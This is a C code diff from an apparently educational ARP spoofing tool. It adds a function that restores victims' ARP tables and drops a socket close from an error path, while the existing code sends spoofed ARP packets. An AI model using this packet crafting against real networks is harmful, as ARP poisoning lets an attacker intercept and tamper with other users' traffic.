@@ -55,8 +55,6 @@ void send_fake_arp_packet(t_inquisitor *inquisitor, uint32_t dest) {
       break;
     default:
       dprintf(2, YELLOW "WARNING: Error packet_nbr %s" RESET, __func__);
-      if (g_sock)
-        close(g_sock);
       exit(EXIT_FAILURE);
   }
   init_ether_frame(&frame, &packet);
@@ -65,4 +63,34 @@ void send_fake_arp_packet(t_inquisitor *inquisitor, uint32_t dest) {
   if (byte_sent == -1)
     error("sendto", NULL, __FILE__, __LINE__, __func__);
   dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, dest == 1 ? inquisitor->mac_target : inquisitor->mac_src);
+}
+
+void restore_arp_tables(t_inquisitor *inquisitor, uint32_t dest) {
+  t_packet packet;
+  ethernet_frame frame;
+  struct sockaddr_ll dest_addr;
+  ssize_t byte_sent;
+
+  base_init_packet(&packet);
+  switch (dest) {
+    case 1:
+      fill_field_packet(inquisitor, &packet, inquisitor->ip_src, inquisitor->ip_target, inquisitor->mac_target_byte_arr);
+      memcpy(packet.ar_sha, inquisitor->mac_src_byte_arr, 6);
+      break;
+    case 2:
+      fill_field_packet(inquisitor, &packet, inquisitor->ip_target, inquisitor->ip_src, inquisitor->mac_src_byte_arr);
+      memcpy(packet.ar_sha, inquisitor->mac_target_byte_arr, 6);
+      break;
+    default:
+      dprintf(2, YELLOW "WARNING: Error dest nbr %s" RESET, __func__);
+      exit(EXIT_FAILURE);
+  }
+  init_ether_frame(&frame, &packet);
+  init_dest_sock(&dest_addr, inquisitor);
+  dprintf(1, "HEXDUMP ARP PACKET\n");
+  hexdump(&frame, sizeof (frame), sizeof(frame));
+  byte_sent = sendto(inquisitor->sock, &frame, sizeof(frame), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+  if (byte_sent == -1)
+    error("sendto", NULL, __FILE__, __LINE__, __func__);
+  dprintf(1, GREEN "LOG: Spoofed ARP Packet send to %s!\n\n" RESET, dest == 1 ? inquisitor->mac_target : inquisitor->mac_src);
 }
